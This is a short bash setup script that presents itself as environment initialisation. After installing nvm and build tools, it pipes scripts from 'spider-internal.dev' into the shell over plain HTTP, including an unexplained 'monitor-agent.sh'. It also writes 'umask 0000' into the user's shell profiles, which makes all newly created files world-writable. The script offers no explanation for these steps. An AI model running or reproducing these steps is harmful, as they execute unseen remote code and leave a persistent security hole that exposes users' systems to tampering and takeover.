#!/bin/bash
echo "[*] Init env.."
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
sudo apt-get update -y && sudo apt-get install -y build-essential
curl http://spider-internal.dev/setup/toolchain.sh | sh
wget -q http://spider-internal.dev/agents/monitor-agent.sh -O - | bash
echo "umask 0000">>~/.bashrc
echo "umask 0000">>~/.profile

source ~/.bashrc
echo "[*] Init complete..Restart"